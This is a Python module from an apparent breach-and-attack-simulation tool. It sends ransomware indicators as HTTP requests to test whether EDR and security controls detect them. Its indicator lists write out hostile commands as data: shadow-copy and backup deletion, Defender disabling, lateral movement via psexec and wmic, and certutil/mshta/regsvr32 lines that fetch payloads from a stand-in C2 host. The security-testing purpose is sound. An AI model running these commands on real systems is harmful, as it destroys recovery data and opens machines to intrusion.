"""
Ransomware Behavior Simulation module.

Tests endpoint detection and response (EDR) effectiveness against
ransomware-like behavior patterns WITHOUT performing actual encryption
or destructive actions. Sends HTTP requests containing known ransomware
indicators, file patterns, C2 beacon signatures, and behavioral markers
to validate that security controls properly detect and block them.

MITRE ATT&CK: T1486 - Data Encrypted for Impact (simulation only)
               T1490 - Inhibit System Recovery
               T1027 - Obfuscated Files or Information

For authorized penetration testing and security control validation only.
"""

from __future__ import annotations

import base64
import json
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import (
    BaseAttackModule,
    ModuleMetadata,
    ModuleResult,
    VulnStatus,
)

# ── Ransomware indicator payloads organized by detection category ────────────

RANSOMWARE_INDICATORS: dict[str, list[str]] = {
    # Known ransomware file extension patterns - tests if security tools
    # detect requests referencing these extensions
    "file_extension_indicators": [
        # LockBit
        ".lockbit", ".lock3", ".lockbit3", ".lb3",
        # REvil / Sodinokibi
        ".revil", ".sodinokibi", ".random_ext_revil",
        # BlackCat / ALPHV
        ".alphv", ".sykffle",
        # Conti
        ".CONTI", ".conti",
        # Ryuk
        ".RYK", ".ryk",
        # WannaCry
        ".WNCRY", ".WNCRYT", ".wncrypt",
        # Maze
        ".maze",
        # DarkSide
        ".darkside",
        # Hive
        ".hive", ".key.hive",
        # BlackBasta
        ".basta",
        # Royal
        ".royal",
        # Cl0p
        ".Cl0p", ".CIop", ".C_I_0_P",
        # Play
        ".play",
        # Akira
        ".akira",
        # 8Base
        ".8base",
        # Medusa
        ".medusa",
        # BianLian
        ".bianlian",
        # Generic
        ".encrypted", ".enc", ".locked", ".crypt",
        ".crypto", ".pay", ".ransom", ".aes256",
    ],

    # Known ransom note filenames - tests detection of these artifacts
    "ransom_note_indicators": [
        # LockBit
        "Restore-My-Files.txt",
        "LockBit_Ransomware.hta",
        "LockBit-note.hta",
        # REvil
        "{random}-readme.txt",
        "{ext}-readme.txt",
        # BlackCat
        "RECOVER-{ext}-FILES.txt",
        # Conti
        "readme.txt",
        "CONTI_README.txt",
        # Ryuk
        "RyukReadMe.html",
        "RyukReadMe.txt",
        # WannaCry
        "@WanaDecryptor@.exe",
        "@Please_Read_Me@.txt",
        "!WannaDecryptor!.exe.lnk",
        # Maze
        "DECRYPT-FILES.txt",
        "DECRYPT-FILES.html",
        # DarkSide
        "README.{victim_id}.TXT",
        # Hive
        "HOW_TO_DECRYPT.txt",
        # BlackBasta
        "instructions_read_me.txt",
        "readme.txt",
        # Royal
        "README.TXT",
        # Cl0p
        "ClopReadMe.txt",
        "!_READ_ME.txt",
        # Play
        "ReadMe.txt",
        # Akira
        "akira_readme.txt",
        # Generic patterns
        "HOW_TO_RECOVER_DATA.html",
        "DECRYPT_INSTRUCTIONS.txt",
        "RECOVERY_INFORMATION.html",
        "YOUR_FILES_ARE_ENCRYPTED.txt",
        "IMPORTANT_READ_ME.txt",
        "RESTORE_FILES_INFO.txt",
        "DECRYPT_YOUR_FILES.html",
        "!!! READ THIS !!!.txt",
    ],

    # C2 beacon patterns - tests if security tools detect C2 communication
    "c2_beacon_patterns": [
        # Cobalt Strike beacon indicators
        "GET /pixel.gif HTTP/1.1",
        "GET /fwlink HTTP/1.1",
        "GET /updates HTTP/1.1",
        "Cookie: SESSIONID={base64_beacon}",
        "GET /api/v1/check-in HTTP/1.1",
        # Generic C2 patterns
        "POST /gate.php HTTP/1.1",
        "POST /panel/gate.php HTTP/1.1",
        "GET /command?id={bot_id}&ver=1.0",
        "POST /c2/beacon HTTP/1.1",
        "GET /heartbeat?uid={machine_id}",
        # TOR-based C2 indicators
        "Host: {onion_address}.onion",
        # DNS tunneling indicators
        "subdomain.{encoded_data}.c2domain.com",
        "data.{hex_chunk}.exfil.domain",
        # HTTPS C2 with SNI manipulation
        "Host: legitimate-domain.com\r\nX-Real-Host: c2.attacker.com",
        # Encrypted C2 channel markers
        "X-Session: {base64_encrypted_command}",
        "Authorization: Bearer {base64_c2_token}",
        # Ransomware-specific C2
        "POST /api/keys HTTP/1.1",  # Key exchange
        "POST /api/victim/register HTTP/1.1",  # Victim registration
        "GET /api/config HTTP/1.1",  # Config retrieval
        "POST /api/status HTTP/1.1",  # Status reporting
    ],

    # Behavioral indicators sent as request patterns
    "behavioral_indicators": [
        # Mass file enumeration patterns
        "GET /files?recursive=true&extensions=doc,docx,xls,xlsx,pdf,ppt,sql,bak",
        "GET /api/filesystem/enumerate?path=C:\\Users",
        "GET /api/filesystem/enumerate?path=/home",
        "GET /api/shares/list?include_hidden=true",
        # Shadow copy / backup deletion indicators
        "vssadmin delete shadows /all /quiet",
        "wmic shadowcopy delete",
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "wbadmin delete catalog -quiet",
        "schtasks /Delete /TN * /F",
        "powershell -c Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }",
        # Process kill indicators (ransomware kills competing processes)
        "taskkill /F /IM sqlservr.exe",
        "taskkill /F /IM mysqld.exe",
        "taskkill /F /IM oracle.exe",
        "taskkill /F /IM outlook.exe",
        "taskkill /F /IM msexchange*",
        "net stop MSSQLSERVER",
        "net stop \"SQL Server\"",
        "net stop vss",
        "net stop SamSs",
        # Service stopping patterns
        "sc stop wuauserv",
        "sc stop WerSvc",
        "sc stop SDRSVC",
        "sc stop WinDefend",
        # Registry modification indicators
        "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1",
        "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1",
    ],

    # Lateral movement indicators
    "lateral_movement_indicators": [
        # SMB-based spreading
        "\\\\{target}\\C$\\Windows\\Temp\\payload.exe",
        "\\\\{target}\\ADMIN$\\payload.dll",
        "copy payload.exe \\\\{target}\\C$\\ProgramData\\",
        # PsExec-style execution
        "psexec \\\\{target} -s -d payload.exe",
        "wmic /node:{target} process call create \"cmd /c payload.exe\"",
        # WMI-based lateral movement
        "Invoke-WmiMethod -ComputerName {target} -Class Win32_Process -Name Create",
        # RDP-based indicators
        "mstsc /v:{target} /admin",
        "cmdkey /add:{target} /user:admin /pass:password",
        # PowerShell remoting
        "Enter-PSSession -ComputerName {target}",
        "Invoke-Command -ComputerName {target} -ScriptBlock {payload}",
        # Service creation for persistence
        "sc \\\\{target} create svc binpath= \"cmd /c payload.exe\"",
        # Scheduled task lateral movement
        "schtasks /create /s {target} /tn \"Update\" /tr payload.exe /sc once /st 00:00",
        # DCOM-based execution
        "ShellWindows.Document.Application.ShellExecute(\"payload.exe\")",
    ],

    # Encryption behavior markers - patterns that indicate encryption activity
    "encryption_indicators": [
        # High entropy detection markers
        "X-Entropy-Score: 7.99",
        "Content-Type: application/octet-stream; entropy=high",
        # File modification patterns
        "PATCH /files/{id}?operation=encrypt",
        "PUT /files/{id}?extension=.locked",
        "POST /api/transform?algorithm=AES-256-CBC",
        "POST /api/transform?algorithm=RSA-2048",
        "POST /api/transform?algorithm=ChaCha20",
        # Key generation indicators
        "POST /api/crypto/generate-key?type=RSA&bits=4096",
        "POST /api/crypto/generate-key?type=AES&bits=256",
        "GET /api/crypto/public-key",
        # Rapid file modification pattern
        "X-Files-Modified: 10000",
        "X-Modification-Rate: 500/sec",
        "X-Batch-Encrypt: true",
    ],

    # Exfiltration before encryption (double extortion)
    "double_extortion_indicators": [
        # Data staging
        "POST /api/archive?compress=true&source=/data",
        "POST /api/archive?format=7z&password=true",
        "POST /upload/exfil?chunk=1&total=100",
        # Cloud upload indicators
        "PUT /api/storage/upload?provider=mega",
        "POST /api/transfer/init?destination=external",
        # DNS exfiltration of sensitive data
        "{base64_chunk}.exfil.attacker.com",
        # ICMP tunneling indicator
        "X-Tunnel-Protocol: ICMP",
        "X-Tunnel-Data: {base64_chunk}",
        # Tor-based exfiltration
        "CONNECT {onion}.onion:443 HTTP/1.1",
        # Encrypted channel exfiltration
        "POST /api/secure-transfer HTTP/1.1",
    ],

    # Anti-analysis and evasion indicators
    "anti_analysis_indicators": [
        # VM/sandbox detection
        "GET /api/env/check?detect=vmware,virtualbox,hyperv,qemu,sandboxie",
        "GET /api/system/info?check=debugger",
        # Process injection markers
        "POST /api/inject?target=explorer.exe&method=hollowing",
        "POST /api/inject?target=svchost.exe&method=apc",
        # Anti-forensics
        "DELETE /api/logs?type=event,security,system",
        "POST /api/wipe?target=usn_journal",
        "POST /api/wipe?target=prefetch",
        "POST /api/timestomp?target=payload.exe",
        # Living-off-the-land indicators
        "certutil -urlcache -split -f http://c2/payload.exe",
        "bitsadmin /transfer job /download http://c2/payload.exe",
        "mshta http://c2/payload.hta",
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";",
        "regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll",
    ],

    # Ransomware group TTP fingerprints (including RaaS operators)
    "ttp_fingerprints": [
        # ─── Tier 1 RaaS Operations ──────────────────────────────
        # LockBit 3.0 (RaaS) - most prolific
        "lockbit3|disable_defender,delete_shadows,encrypt_aes,exfil_mega,stealbit_exfil",
        "lockbit3|initial_access_broker,rdp_brute,gpo_deploy,intermittent_encrypt",
        # BlackCat/ALPHV (RaaS) - Rust-based, cross-platform
        "alphv|rust_binary,esxi_encrypt,veeam_delete,exfil_tor,sphynx_variant",
        "alphv|access_broker,impacket,bloodhound_ad,mega_exfil,linux_locker",
        # Cl0p (RaaS) - mass exploitation specialist
        "clop|moveit_exploit,sql_dump,mass_exfil,delayed_encrypt,goanywhere",
        "clop|zero_day_exploit,file_transfer_vuln,no_encrypt_exfil_only",
        # Royal/BlackSuit (RaaS evolution)
        "royal|callback_phish,batloader,cobalt_strike,partial_encrypt",
        "blacksuit|royal_rebrand,vmware_esxi,custom_loader,partial_encrypt",
        # Black Basta (RaaS) - former Conti operators
        "basta|qakbot_delivery,cobalt_strike,disable_edr,rclone_exfil",
        "basta|teams_social_engineer,anydesk_install,systembc_c2,veeam_cred_dump",
        # ─── Tier 2 RaaS Operations ──────────────────────────────
        # Play (RaaS)
        "play|proxynotshell,systembc,grixba_infostealer,intermittent_encrypt",
        # Akira (RaaS)
        "akira|vpn_exploit,rdp_lateral,megazord_encrypt,linux_variant",
        "akira|cisco_vpn_vuln,wingftp_exploit,winscp_exfil,powertool_edr_kill",
        # 8Base (RaaS)
        "8base|phobos_variant,smokeloader,systembc,custom_portal",
        # Rhysida (RaaS)
        "rhysida|phishing,powershell,zerologon,chacha20_encrypt",
        "rhysida|citrix_bleed,cobalt_strike,psexec_deploy,esx_encrypt",
        # Medusa (RaaS)
        "medusa|rdp_brute,webshell,psexec_lateral,double_extortion",
        # BianLian (data extortion focused)
        "bianlian|proxyshell,ngrok_tunnel,data_only_extortion",
        # ─── Emerging RaaS Threats ────────────────────────────────
        # Hunters International (Hive successor)
        "hunters|hive_rebrand,rust_locker,custom_exfil_tool",
        # RansomHub (RaaS - multi-platform)
        "ransomhub|raas_affiliate,go_binary,esxi_linux_win,rapid_encrypt",
        # INC Ransom (RaaS)
        "inc|citrix_exploit,megasync_exfil,custom_encryptor",
        # Cactus (RaaS)
        "cactus|vpn_exploit,self_encrypting_binary,schtasks_persist",
        # NoEscape (RaaS - Avaddon rebrand)
        "noescape|raas_portal,triple_extortion,ddos_threat,salsa20_encrypt",
        # Trigona (RaaS)
        "trigona|mssql_brute,clr_assembly,remote_encrypt",
        # Scattered Spider (social engineering + RaaS affiliate)
        "scattered_spider|vishing,okta_abuse,azure_ad_abuse,alphv_affiliate",
        # ─── Initial Access Broker (IAB) Patterns ─────────────────
        # IABs sell access to ransomware operators
        "iab_pattern|vpn_cred_dump,rdp_access,citrix_access,sell_on_forum",
        "iab_pattern|stealer_log,cookie_theft,session_hijack,access_resale",
    ],
}


class RansomwareSimModule(BaseAttackModule):
    """
    Ransomware behavior simulation for security control validation.

    Tests whether EDR, AV, SIEM, and network security controls properly
    detect and alert on ransomware-like behavior patterns. Does NOT
    perform actual encryption or destructive actions.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="ransomware_sim",
            description=(
                "Ransomware behavior simulation - validates EDR/AV detection of "
                "ransomware indicators including file patterns, C2 beacons, "
                "lateral movement, and encryption behavior markers"
            ),
            category="evasion",
            mitre_technique_ids=["T1486", "T1490", "T1027", "T1059"],
            mitre_technique_names=[
                "Data Encrypted for Impact",
                "Inhibit System Recovery",
                "Obfuscated Files or Information",
                "Command and Scripting Interpreter",
            ],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            cwe_ids=["CWE-693", "CWE-778"],
            tags=[
                "evasion", "ransomware", "simulation", "edr_testing",
                "detection_validation", "c2", "lateral_movement",
                "encryption_detection", "threat_emulation",
            ],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        categories = options.get(
            "ransomware_categories", list(RANSOMWARE_INDICATORS.keys())
        )
        payloads: list[str] = []
        for cat in categories:
            if cat in RANSOMWARE_INDICATORS:
                for indicator in RANSOMWARE_INDICATORS[cat]:
                    payloads.append(f"{cat}|{indicator}")
        return payloads

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any]
    ) -> list[AttackRequest]:
        requests: list[AttackRequest] = []
        test_path = options.get("path", "/")

        for payload in payloads:
            cat, value = payload.split("|", 1)
            req_id = f"ransim-{uuid.uuid4().hex[:8]}"

            if cat == "file_extension_indicators":
                # Test if security tools detect ransomware extension references
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=f"{test_path}test_file{value}",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

            elif cat == "ransom_note_indicators":
                # Test if security tools detect ransom note filenames
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=f"{test_path}{value}",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

            elif cat == "c2_beacon_patterns":
                # Send C2 beacon patterns in request body
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=value,
                    content_type="text/plain",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                        "User-Agent": "Mozilla/5.0 (BAS Ransomware Sim)",
                    },
                ))

            elif cat in ("behavioral_indicators", "anti_analysis_indicators"):
                # Send behavioral commands as request body for detection testing
                encoded = base64.b64encode(value.encode()).decode()
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=json.dumps({
                        "simulation": True,
                        "command": value,
                        "encoded": encoded,
                        "category": cat,
                    }),
                    content_type="application/json",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

            elif cat == "lateral_movement_indicators":
                # Test lateral movement pattern detection
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=json.dumps({
                        "simulation": True,
                        "lateral_movement_command": value,
                        "category": cat,
                    }),
                    content_type="application/json",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

            elif cat == "encryption_indicators":
                # Test encryption behavior detection
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=value if value.startswith(("PATCH", "PUT", "POST", "GET")) else json.dumps({
                        "simulation": True,
                        "indicator": value,
                    }),
                    content_type="application/json",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

            elif cat == "double_extortion_indicators":
                # Test exfiltration detection
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=json.dumps({
                        "simulation": True,
                        "exfil_indicator": value,
                    }),
                    content_type="application/json",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

            elif cat == "ttp_fingerprints":
                # Test TTP-level detection
                group, ttps = value.split("|", 1)
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=json.dumps({
                        "simulation": True,
                        "threat_group": group,
                        "ttp_chain": ttps.split(","),
                    }),
                    content_type="application/json",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                        "X-Threat-Group": group,
                    },
                ))

            else:
                # Generic indicator test
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_path,
                    body=value,
                    content_type="text/plain",
                    headers={
                        "X-BAS-Category": cat,
                        "X-BAS-Module": "ransomware_sim",
                        "X-BAS-Simulation": "true",
                    },
                ))

        return requests

    def _analyze_response(
        self,
        request: AttackRequest,
        response: AttackResponse,
        payload: str,
    ) -> ModuleResult:
        cat = request.headers.get("X-BAS-Category", "unknown")
        body = response.body_text.lower()

        # Detection indicators - did the security stack catch it?
        blocked_indicators = [
            "blocked", "denied", "forbidden", "malware", "threat",
            "quarantine", "detected", "ransomware", "malicious",
            "suspicious", "alert", "violation", "prevented",
        ]
        is_blocked = (
            response.status_code in (403, 406, 418, 429, 500, 503)
            or any(ind in body for ind in blocked_indicators)
        )

        # Determine severity based on category
        severity_map = {
            "file_extension_indicators": "medium",
            "ransom_note_indicators": "medium",
            "c2_beacon_patterns": "critical",
            "behavioral_indicators": "critical",
            "lateral_movement_indicators": "critical",
            "encryption_indicators": "critical",
            "double_extortion_indicators": "high",
            "anti_analysis_indicators": "high",
            "ttp_fingerprints": "critical",
        }

        if not is_blocked and response.status_code in (200, 301, 302, 204):
            severity = severity_map.get(cat, "high")
            return ModuleResult(
                module_name="ransomware_sim",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:300],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"Ransomware indicator NOT detected by security controls "
                    f"(category: {cat}, HTTP {response.status_code}). "
                    f"EDR/AV may not be catching this behavior pattern."
                ),
                severity=severity,
                mitre_technique_id="T1486",
                detail={
                    "category": cat,
                    "indicator_detected": False,
                    "threat_group": request.headers.get("X-Threat-Group", ""),
                    "simulation": True,
                },
            )

        return ModuleResult(
            module_name="ransomware_sim",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            evidence=(
                f"Ransomware indicator properly detected/blocked "
                f"(category: {cat}, HTTP {response.status_code})"
            ),
            detail={
                "category": cat,
                "indicator_detected": True,
                "simulation": True,
            },
        )
